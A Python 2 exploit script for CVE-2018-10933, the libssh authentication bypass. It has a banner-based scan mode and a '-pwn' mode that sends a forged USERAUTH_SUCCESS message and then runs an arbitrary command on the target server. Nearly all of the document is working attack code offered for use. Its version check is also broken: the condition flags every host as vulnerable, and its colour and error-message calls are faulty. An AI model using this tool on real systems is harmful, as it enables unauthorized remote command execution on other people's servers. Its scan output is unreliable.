# CVE -2018-10933 testing script made by Freed0m.
# This tool is able to perform two types of testing:
# 1 - Try to grab the SSH library version, and if it matches to a vulnerable one, print a msg and exit.
# 2 - Attempt to initiate SSH connection to the specified target(s) and to bypass authentication
#     by sending SSH2_MSG_USERAUTH_SUCCESS message.
# Written by @x_Freed0m
import socket
import sys

sock = socket.socket()
bufsize = 2048
vuln1 = "0.7.6"
vuln2 = "0.8.4"

def pip_installer():
    try:
        import paramiko
        global paramiko
        import termcolor
        global termcolor
    except ImportError:
        import pip
        pip.main(['install', 'paramiko'])
        import paramiko
        global paramiko
        pip.main(['install', 'termcolor'])
        import termcolor
        global termcolor


def ssh_banner(host, port): #change this to check the SSH hash, add colors
    sock.connect((host, int(port)))
    try:
        banner = sock.recv(1024)
        sock.close()
        print "[*] " + host + " SSH banner is: " + banner
#        libssh_ver = banner.split("-")[3]
        if vuln1 or vuln2 not in banner:
            print colored("[+] Host *MIGHT* be vulnerable, saving to log", 'green')
            f = open("vulnerable_hosts.txt", "a")
            f.write(host + ':' + port + '\n')
            f.close()
        else:
            print colored("[-] Host is patched. NOT vulnerable", 'red')

    except:
        print colored("[-] Could not connect to %s using port %s, please check the address and the port", 'red' % (host, port))

def sshlib_connect(host, port, command):
    try:
        paramiko.util.log_to_file('debug.log')
        sock.connect((host, int(port)))
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        msg = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(msg)

        cmd_channel = transport.open_session(timeout=15)
        cmd_channel.exec_command(command)

        stdout = cmd_channel.makefile("rb", bufsize)
        stderr = cmd_channel.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()
        print "\n[*]Command requested: " + command
        print colored("\n[+]Command output: " + (output + error).decode(), 'green')

    except Exception as e:
        print e

def help():
    print "This tools is intended to scan and\or run a command on vulnerable libssh servers"
    print "by exploiting the CVE-2018-10933 vulnerability "
    print "Written by @x_Freed0m"
    print "\nUsage: "
    print "python CVE-2018-10933.py HOST PORT MODULE[-scan\-pwn] COMMAND[if pwn is used]"
    sys.exit()

def main(): # add logs and ability to run on subnets and input files dor th scanner
    if len(sys.argv) < 4:
        help()
    else:
        host = sys.argv[1]
        port = sys.argv[2]
        module = sys.argv[3]
        if module == '-scan':
            print "\n[*] Starting to scan " + host
            ssh_banner(host, port)
        elif module == '-pwn':
            if len(sys.argv) != 5:
                print "\n[*] Please specify a command to run"
                sys.exit()
            else:
                import paramiko
                command = sys.argv[4]
                sshlib_connect(host, int(port), command)
        else:
            print "\n[*]Please choose '-scan' or '-pwn'"


if __name__ == '__main__':
     pip_installer()
     main()